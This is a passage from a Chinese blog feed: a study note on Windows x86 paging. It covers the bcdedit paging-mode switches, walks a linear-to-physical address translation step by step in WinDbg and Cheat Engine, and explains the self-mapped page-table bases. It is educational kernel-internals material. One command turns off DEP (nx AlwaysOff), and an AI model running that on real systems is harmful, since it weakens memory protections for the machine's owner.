</span><br><span class="line">bcdedit /set nx AlwaysOff </span><br></pre></td></tr></table></figure><p>如果要关闭那么用下面两个指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /set pae forceEnable</span><br><span class="line">bcdedit /set nx OptIn</span><br></pre></td></tr></table></figure><p>这样就回到了 2-9-9-12 分页。</p><ul><li>如果是2-9-9-12分页运行的内核 ntkrnlpa.exe</li><li>如果是10-10-12分页运行的内核 ntoskrnl.exe</li></ul><h3 id="地址翻译练习"><a href="#地址翻译练习" class="headerlink" title="地址翻译练习"></a>地址翻译练习</h3><p>但是物理地址与之完全不一样，先可以尝试通过 windbg 练习寻找物理地址，这里使用记事本配合CE。</p><img src="/2024/11/07/WindowsKernel1/5.png" class=""><p>那么得到线性地址是 <code>0029DFB0</code>，根据 10-10-12 分页规则，将页表拆开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0000000000 1010011101 111110110000</span><br></pre></td></tr></table></figure><p>这三部分分别是，页目录项（PDE），页表项（PTE），页内偏移（offset）。</p><img src="/2024/11/07/WindowsKernel1/6.png" class=""><p>找到页表基址，获得页目录项的地址，即 <code>DirBase+4*PDE</code>。在这里页表项地址就是 <code>DirBase</code>，随后跟过去，这里需要注意，这个地址并不是真的地址，而是因为每个页表项它有一定的大小。可能装下一个页目录项就要完整的一个页，如果是这样就决定了页目录项的地址一定是页对齐的（最低三位十六进制地址为0），所以我们找到的地址再把最低三位十六进制置为0就是真实的页目录项了，而通过前面的学习也可以看到，最低的十二个位被赋予了特殊的含义。</p><p>我们找到的该内存页目录项地址实际上就是 <code>ad688000</code>，然后再页目录项中找到页表项 <code>1010011101</code> 转为十六进制得到 <code>29d</code>，同样的，页目录项地址+4*PTE 得到页的物理地址，也就是 <code>ad688a74</code>。</p><img src="/2024/11/07/WindowsKernel1/7.png" class=""><p>同样的，这里低三位十六进制也不是真实的地址，需要清零得到该页的页表基址，最后再加上页内偏移，也就是 FB0。</p><img src="/2024/11/07/WindowsKernel1/8.png" class=""><p>成功找到对应的物理内存。</p><p>而我们的 CR3 寄存器存储的就是页目录表的物理地址，即 Page Director Table，那么所说的 PDE 当然就是 Page Director Entry了。PTE 就是 Page Table Entry，对应的每个目录项指向的是一个 PTT，Page Table Table。</p><h2 id="页目录表基址与页表基址"><a href="#页目录表基址与页表基址" class="headerlink" title="页目录表基址与页表基址"></a>页目录表基址与页表基址</h2><p>由于物理地址对操作系统是不可见的，所以操作系统必须有线性访问页表的能力，唯一的办法就是将自身的页表挂在一个特殊的地址上，这个地址是 0xC0300000。</p><img src="/2024/11/07/WindowsKernel1/9.png" class=""><p>也可以发现，CR3 对应的物理地址与线性地址 0xC0300000 是一致的。</p><p>相同与页目录表基址，为了在程序内快速访问页表，也有一个页表基址，页表基址对应的线性地址是 0xC0000000。</p><p>这里记一下通过线性地址寻找PTE和PDE的公式。</p><ul><li>访问页目录表的公式：<code>0xC0300000 + PDI * 4</code></li><li>访问页表的公式：<code>0xC0000000 + PDI * 4096 + PTI * 4</code></li></ul><p>很有趣的是，你会发现如果你要寻找 0xC0300000 对应的页表，用第二个公式代入就是它本身。即</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0xC0300000</span><br><span class="line"></span><br><span class="line">高10位：  1100 0000 00   =   0x300</span><br><span class="line">中间10位：1100 0000 00   =   0x300</span><br><span class="line">低12位：  0000 0000 0000 =   0x000</span><br></pre></td></tr></table></figure><p>代入第二个公式可得 <code>0xC0000000 + 0x300 * 4096 + 0x300 * 4 = 0xC0300000</code></p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://www.cnblogs.com/wingsummer/p/15363603.html">https://www.cnblogs.com/wingsummer/p/15363603.html</a></li><li>[2]：<a href="http://www.qfrost.com/posts/windowskernel/windows%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_4/">http://www.qfrost.com/posts/windowskernel/windows保护模式学习笔记_4&#x2F;</a></li></ul>]]></content>
    
    
    <summary type="html">今天开始正式学习分页的相关知识</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    <category term="分页" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/%E5%88%86%E9%A1%B5/"/>
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/tags/Windows/"/>
    
  </entry>
  
</feed>
